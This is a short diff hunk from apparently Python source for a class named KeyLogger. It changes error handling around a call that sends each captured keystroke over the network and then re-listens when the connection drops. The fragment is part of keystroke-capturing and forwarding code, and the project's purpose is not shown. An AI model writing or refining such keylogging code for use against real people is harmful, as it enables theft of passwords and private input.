@@ -91,7 +91,7 @@ class KeyLogger:
                 if char:
                     try:
                         self.__USBForwarder.send_over_network(char)
-                    except:
+                    except ConnectionResetError:
                         self.__USBForwarder.listen()
 
                 # try:
